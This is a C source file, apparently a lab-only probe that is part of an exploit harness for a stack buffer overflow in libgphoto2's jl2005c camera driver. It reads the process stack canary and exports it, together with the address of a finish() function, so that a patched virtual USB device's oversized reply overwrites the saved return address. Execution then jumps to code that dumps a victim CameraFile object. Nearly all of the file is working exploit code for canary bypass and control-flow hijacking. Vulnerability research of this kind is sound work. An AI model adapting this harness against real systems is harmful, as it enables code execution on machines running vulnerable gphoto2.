/* W170 lab-only local probe (untracked). Not part of the committed harness.
 * Build against the local plain install:
 *   P=$PWD/src/libgphoto2-2.5.34-plain/installdir-plain
 *   gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I$P/include \
 *     -o live/victim_probe live/victim_probe.c \
 *     -L$P/lib -lgphoto2 -lgphoto2_port -Wl,-rpath,$P/lib
 *
 * The patched local vusb mode 'v' allocates a live CameraFile during the
 * oversized bulk read (after camera->pl exists) and stores it in the
 * exported global below. The device reply supplies the process canary and
 * a chosen saved RIP so jl2005c_init returns to finish(), which reports the
 * victim object's bytes and the values returned by the real gphoto2 API.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <gphoto2/gphoto2.h>

void *m2s_victim_file;            /* looked up by the patched vusb port */

static unsigned long own_canary(void)
{
	unsigned long v;
	__asm__ volatile("mov %%fs:0x28, %0" : "=r"(v));
	return v;
}

static void hexenv(const char *name, unsigned long v)
{
	char buf[64];
	snprintf(buf, sizeof(buf), "0x%016lx", v);
	setenv(name, buf, 1);
}

static void finish(void)
{
	const char *data = NULL;
	unsigned long size = 0;
	unsigned char *p = (unsigned char *)m2s_victim_file;
	int i, rc;

	fprintf(stderr, "VICTIM_ARRIVED %p\n", m2s_victim_file);
	if (p) {
		for (i = 0x140; i < 0x190; i += 8) {
			unsigned long w = 0;
			memcpy(&w, p + i, 8);
			fprintf(stderr, "VICTIM+%03x = 0x%016lx\n", i, w);
		}
	}
	rc = gp_file_get_data_and_size((CameraFile *)m2s_victim_file, &data, &size);
	fprintf(stderr, "GP_FILE_GET rc=%d data=%p size=0x%lx\n", rc,
		(void *)data, size);
	fflush(stderr);
	_exit(0);
}

int main(int argc, char **argv)
{
	Camera *cam = NULL;
	const char *path = argc > 1 ? argv[1] : "usb:001,001";
	int rc;

	if (!getenv("M2SHELL_JL2005_CANARY")) hexenv("M2SHELL_JL2005_CANARY", own_canary());
	hexenv("M2SHELL_JL2005_RIP", (unsigned long)(void *)&finish);
	if (!getenv("M2SHELL_JL2005_FILL")) setenv("M2SHELL_JL2005_FILL", "0x41", 1);

	if (gp_camera_new(&cam) < GP_OK) return 2;
	rc = gp_camera_init(cam, NULL);
	fprintf(stderr, "GP_CAMERA_INIT rc=%d (no RIP diversion)\n", rc);
	return 0;
}
